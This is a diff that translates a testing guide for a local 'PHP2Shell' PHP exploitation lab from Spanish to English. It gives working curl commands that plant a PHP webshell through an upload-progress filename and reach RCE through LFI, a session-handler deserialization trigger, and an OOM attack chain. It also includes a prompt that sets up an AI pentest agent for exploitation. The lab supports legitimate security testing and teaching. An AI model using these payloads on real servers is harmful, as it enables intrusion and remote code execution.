@@ -1,59 +1,59 @@
-# Guía de testing — PHP2Shell Lab
+# Testing guide — PHP2Shell Lab
 
-Esta guía proporciona **pruebas prácticas** paso a paso para verificar cada cadena de ataque reproducible en el lab.
+This guide provides **hands-on tests** for verifying each attack chain reproducible in the lab.
 
-> **NOTA SOBRE EXPLOITS:** El directorio `exploits/` contiene scripts ejecutables completos para cada cadena de ataque. Este directorio está **gitignoreado por defecto** y no debe ser versionado. Para más información sobre los exploits disponibles, consulta `exploits/README.md`.
+> **NOTE ON EXPLOITS:** The `exploits/` directory contains complete executable scripts for each attack chain. This directory is **gitignored by default** and must not be versioned. For more information about the available exploits, see `exploits/README.md`.
 
 ---
 
-## Pre-requisitos
+## Prerequisites
 
-1. **Lab arrancado:**
+1. **Lab running:**
    ```bash
    cd labs/php2shell-lab
    docker compose up -d
    ```
 
-2. **Verificar que los contenedores están arriba:**
+2. **Verify the containers are up:**
    ```bash
    docker ps --filter "name=php2shell"
    ```
-   Deberías ver 3 contenedores: `php2shell-nginx`, `php2shell-fpm`, `php2shell-apache`.
+   You should see 3 containers: `php2shell-nginx`, `php2shell-fpm`, `php2shell-apache`.
 
-3. **Confirmar versión vulnerable:**
+3. **Confirm the vulnerable version:**
    ```bash
    curl -s http://127.0.0.1:18080/index.php
    ```
-   Salida esperada:
+   Expected output:
    ```
    PHP 8.2.34
    SAPI fpm-fcgi
    upload_progress 1
    OK
    ```
-   Verifica que la versión es `< 8.2.35` y que `upload_progress` es `1`.
+   Verify that the version is `< 8.2.35` and that `upload_progress` is `1`.
 
 ---
 
 ## Test 1: Chain A — Session File Injection + LFI → RCE
 
-**Objetivo:** conseguir ejecución de comandos inyectando código PHP en el filename de un upload multipart y luego incluyendo el fichero de sesión vía LFI.
+**Objective:** achieve command execution by injecting PHP code into the filename of a multipart upload and then including the session file via LFI.
 
-### Usando el exploit automatizado
+### Using the automated exploit
 
-El directorio `exploits/` contiene scripts completos que implementan cada cadena de ataque. **Este directorio está gitignoreado y no debe ser versionado.**
+The `exploits/` directory contains complete scripts implementing each attack chain. **This directory is gitignored and must not be versioned.**
 
 ```bash
-# Ejecutar exploit de Chain A
+# Run the Chain A exploit
 python3 exploits/exploit_chain_a.py http://127.0.0.1:18080 "id"
 ```
 
-**Resultado esperado:** la salida debe contener la ejecución de `id` (ej. `uid=33(www-data)`).
+**Expected result:** the output must contain the execution of `id` (e.g. `uid=33(www-data)`).
 
-### Verificación manual con curl (sin exploit script):
+### Manual verification with curl (no exploit script):
 
 ```bash
-# Paso 1: POST multipart con payload en filename
+# Step 1: multipart POST with the payload in the filename
 SID="chainAtest000000000000000000"
 curl -X POST http://127.0.0.1:18080/index.php \
   -H "Cookie: PHPSESSID=$SID" \
@@ -61,141 +61,135 @@ curl -X POST http://127.0.0.1:18080/index.php \
   -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
   -F 'f=@-;filename="<?php system($_GET['"'"'c'"'"']); ?>"' <<< "dummy"
 
-# Paso 2: GET al LFI con el comando
+# Step 2: GET to the LFI with the command
 curl -s "http://127.0.0.1:18080/vuln.php?page=/tmp/sessions/sess_${SID}&c=id"
 ```
 
-**Criterio de éxito:** aparece la salida de `id` en la respuesta de `/vuln.php`.
+**Success criterion:** the output of `id` appears in the `/vuln.php` response.
 
 ---
 
 ## Test 2: Chain C — Handler Mismatch → `__destruct`
 
-**Objetivo:** escribir un objeto serializado con handler `php_serialize` (que preserva pipes) y leerlo con handler `php` (que interpreta pipe como separador), disparando deserialización y `__destruct`.
+**Objective:** write a serialized object with the `php_serialize` handler (which preserves pipes) and read it with the `php` handler (which interprets the pipe as a separator), triggering deserialization and `__destruct`.
 
-### Usando el exploit automatizado
+### Using the automated exploit
 
 ```bash
-# Ejecutar exploit de Chain C (requiere LFI)
+# Run the Chain C exploit (requires LFI)
 python3 exploits/exploit_chain_c.py http://127.0.0.1:18080 "whoami"
 ```
 
-### Verificación manual (sin exploit script):
+### Manual verification (no exploit script):
 
 ```bash
 #!/bin/bash
 SID="chainCtest000000000000000000"
 
 echo "[*] Chain C: Handler mismatch test"
-echo "[1] Escribiendo con php_serialize (preserva pipe)..."
+echo "[1] Writing with php_serialize (preserves pipe)..."
 
-# Paso 1: POST a /app/upload.php (handler php_serialize)
+# Step 1: POST to /app/upload.php (php_serialize handler)
 curl -s -X POST http://127.0.0.1:18080/app/upload.php \
   -H "Cookie: PHPSESSID=$SID" \
   -F "PHPSESSID=$SID" \
   -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
   -F 'f=@-;filename="x|O:8:\"stdClass\":0:{}"' <<< "dummy" > /dev/null
 
-echo "[2] Inspeccionando fichero de sesión (desde dentro del contenedor)..."
+echo "[2] Inspecting the session file (from inside the container)..."
 docker exec php2shell-fpm cat /tmp/sessions/sess_${SID} 2>/dev/null | head -5
 
-echo "[3] Leyendo con handler php (interpreta pipe)..."
-# Paso 2: GET/POST a /api/endpoint.php (handler php)
+echo "[3] Reading with the php handler (interprets pipe)..."
+# Step 2: GET/POST to /api/endpoint.php (php handler)
 curl -s -X POST http://127.0.0.1:18080/api/endpoint.php \
   -H "Cookie: PHPSESSID=$SID" \
   -d "dummy=data"
 
-echo "[4] Comprobando logs de PHP para warnings de deserialización..."
-docker logs php2shell-fpm --tail 20 2>&1 | grep -i "session\|unserialize\|destruct" || echo "(No warnings visibles)"
+echo "[4] Checking PHP logs for deserialization warnings..."
+docker logs php2shell-fpm --tail 20 2>&1 | grep -i "session\|unserialize\|destruct" || echo "(No visible warnings)"
 ```
 
-Guarda como `test_chain_c.sh`, dale permisos de ejecución (`chmod +x test_chain_c.sh`) y ejecuta:
+Save it as `test_chain_c.sh`, make it executable (`chmod +x test_chain_c.sh`) and run it:
 ```bash
 ./test_chain_c.sh
 ```
 
-**Resultado esperado:**
-- El fichero de sesión contiene `x|O:8:\"stdClass\":0:{}` en el campo `name`.
-- Al leerlo con handler `php`, se dispara deserialización (puede generar warning si `display_errors=On`).
-- Con un gadget real (clase con `__destruct`), esto llevaría a RCE. El lab usa `stdClass` como demo, que no tiene destructor explotable pero confirma la mecánica.
+**Expected result:**
+- The session file contains `x|O:8:\"stdClass\":0:{}` in the `name` field.
+- When read with the `php` handler, deserialization is triggered (it may generate a warning if `display_errors=On`).
+- With a real gadget (a class with `__destruct`), this would lead to RCE. The lab uses `stdClass` as a demo, which has no exploitable destructor but confirms the mechanics.
 
 ---
 
 ## Test 3: Chain D — Apache mod_php OOM → RCE
 
-**Objetivo:** disparar OOM en el startup de Apache mod_php enviando headers o body masivos, dejando el executor en estado corrupto.
+**Objective:** trigger an OOM during Apache mod_php startup by sending massive headers or a body, leaving the executor in a corrupt state.
 
-### Usando el exploit automatizado
+### Using the automated exploit
 
 ```bash
-# Ejecutar exploit de Chain D (Apache mod_php con memory_limit bajo)
+# Run the Chain D exploit (Apache mod_php with a low memory_limit)
 python3 exploits/exploit_chain_d.py http://127.0.0.1:18081 "id"
 ```
 
-**Resultado esperado:**
-- Primera request: timeout o conexión cerrada por OOM.
-- Segunda request: puede mostrar comportamiento anómalo (error 500, respuesta corrupta, o en casos extremos, explotación real si hay un gadget en el shutdown path).
+**Expected result:**
+- First request: timeout or connection closed by OOM.
+- Second request: may show anomalous behavior (error 500, corrupt response, or in extreme cases, actual exploitation if there is a gadget in the shutdown path).
 
-**Nota:** Chain D es la más peligrosa porque **no necesita vulnerabilidad de aplicación**. El PoC completo de RCE está en el repo `ikow/php2shell-poc` (no incluido aquí por seguridad).
-
-**Resultado esperado:**
-- Primera request: timeout o conexión cerrada por OOM.
-- Segunda request: puede mostrar comportamiento anómalo (error 500, respuesta corrupta, o en casos extremos, explotación real si hay un gadget en el shutdown path).
-
-**Nota:** Chain D es la más peligrosa porque **no necesita vulnerabilidad de aplicación**. El PoC completo de RCE está en el repo `ikow/php2shell-poc` (no incluido aquí por seguridad).
+**Note:** Chain D is the most dangerous because it **does not need an application vulnerability**. The full RCE PoC is in the `ikow/php2shell-poc` repo (not included here for safety).
 
 ---
 
-## Test 4: Verificación manual desde Vulnerator
+## Test 4: Manual verification from Vulnerator
 
-Si estás usando Vulnerator/Hermes para explotar el lab, usa este prompt (adaptado para **dentro del contenedor Kali** de Vulnerator):
+If you are using Vulnerator/Hermes to exploit the lab, use this prompt (adapted for use **inside the Vulnerator Kali container**):
 
 ```
-Engagement de EXPLOTACION en modo CTF contra un lab LOCAL AUTORIZADO. Target: http://host.docker.internal:18080 (nginx delante de PHP-FPM 8.2.34, SAPI fpm-fcgi). Entorno de laboratorio controlado, localhost, todo autorizado. Objetivo: conseguir RCE reproduciendo la CADENA A de PHP2Shell (CVE-2026-109618 / CVE-2026-109619) y como prueba de concepto ejecutar `id` en el servidor.
+EXPLOITATION engagement in CTF mode against an AUTHORIZED LOCAL lab. Target: http://host.docker.internal:18080 (nginx in front of PHP-FPM 8.2.34, SAPI fpm-fcgi). Controlled lab environment, localhost, everything authorized. Objective: achieve RCE by reproducing CHAIN A of PHP2Shell (CVE-2026-109618 / CVE-2026-109619) and, as a proof of concept, run `id` on the server.
 
-[...resto del prompt del CHAINS.md para Chain A...]
+[...rest of the Chain A prompt from CHAINS.md...]
 
-SCOPE: LAB CTF LOCAL AUTORIZADO. Objetivo unico: http://host.docker.internal:18080 (nginx -> php-fpm 8.2.34). Backend php-fpm en host.docker.internal:9000, save_path de sesiones = /tmp/sessions dentro del contenedor php2shell-fpm. Prohibido cualquier host fuera de host.docker.internal.
+SCOPE: AUTHORIZED LOCAL CTF LAB. Single objective: http://host.docker.internal:18080 (nginx -> php-fpm 8.2.34). php-fpm backend at host.docker.internal:9000, session save_path = /tmp/sessions inside the php2shell-fpm container. Any host outside host.docker.internal is prohibited.
 ```
 
-**Nota:** desde el contenedor Kali de Vulnerator, usar `host.docker.internal` en lugar de `127.0.0.1` para alcanzar el lab del host.
+**Note:** from the Vulnerator Kali container, use `host.docker.internal` instead of `127.0.0.1` to reach the host's lab.
 
 ---
 
 ## Troubleshooting
 
-### Problema: curl devuelve respuesta vacía desde Kali/contenedor
+### Problem: curl returns an empty response from Kali/container
 
-**Causa:** `127.0.0.1` dentro de un contenedor Docker es el propio contenedor, no el host.
+**Cause:** `127.0.0.1` inside a Docker container is the container itself, not the host.
 
-**Solución:** usa `host.docker.internal` en lugar de `127.0.0.1` cuando ejecutes comandos desde dentro de un contenedor:
+**Solution:** use `host.docker.internal` instead of `127.0.0.1` when running commands from inside a container:
 ```bash
 curl http://host.docker.internal:18080/index.php
 ```
 
-### Problema: fichero de sesión no persiste (Chain A)
+### Problem: session file does not persist (Chain A)
 
-**Causa:** `session.upload_progress.cleanup=On` (default de PHP).
+**Cause:** `session.upload_progress.cleanup=On` (PHP default).
 
-**Verificación:** el lab ya tiene `cleanup=Off` en `php.ini` y `php-apache.ini`. Confirma:
+**Verification:** the lab already has `cleanup=Off` in `php.ini` and `php-apache.ini`. Confirm:
 ```bash
 docker exec php2shell-fpm php -i | grep upload_progress.cleanup
 ```
-Salida esperada: `session.upload_progress.cleanup => Off => Off`.
+Expected output: `session.upload_progress.cleanup => Off => Off`.
 
-### Problema: LFI no ejecuta el payload
+### Problem: LFI does not execute the payload
 
-**Causa 1:** path incorrecto. El save_path es `/tmp/sessions` **dentro del contenedor**, no del host.
+**Cause 1:** incorrect path. The save_path is `/tmp/sessions` **inside the container**, not on the host.
 
-**Causa 2:** el payload PHP en el filename tiene comillas mal escapadas.
+**Cause 2:** the PHP payload in the filename has badly escaped quotes.
 
-**Solución:** usar comillas simples o escaping correcto en el boundary multipart. El script Python de ejemplo maneja esto correctamente.
+**Solution:** use single quotes or correct escaping in the multipart boundary. The example Python script handles this correctly.
 
-### Problema: Chain C no dispara deserialización
+### Problem: Chain C does not trigger deserialization
 
-**Causa:** el PHP built-in server ignora `.user.ini`. Este lab usa nginx → php-fpm, que sí respeta `.user.ini`.
+**Cause:** the PHP built-in server ignores `.user.ini`. This lab uses nginx → php-fpm, which does respect `.user.ini`.
 
-**Verificación:** confirma que `/app/` y `/api/` tienen `.user.ini` con handlers distintos:
+**Verification:** confirm that `/app/` and `/api/` have `.user.ini` files with different handlers:
 ```bash
 docker exec php2shell-fpm cat /var/www/html/app/.user.ini
 docker exec php2shell-fpm cat /var/www/html/api/.user.ini
@@ -203,16 +197,16 @@ docker exec php2shell-fpm cat /var/www/html/api/.user.ini
 
 ---
 
-## Limpieza tras testing
+## Cleanup after testing
 
 ```bash
-# Parar y eliminar contenedores
+# Stop and remove containers
 docker compose down
 
-# Opcional: eliminar imágenes descargadas
+# Optional: remove downloaded images
 docker rmi php:8.2.34-fpm php:8.2.34-apache nginx:alpine
 ```
 
 ---
 
-**Para uso exclusivo en entornos de CTF local autorizado. No ejecutar contra sistemas externos.**
+**For use only in authorized local CTF environments. Do not run against external systems.**
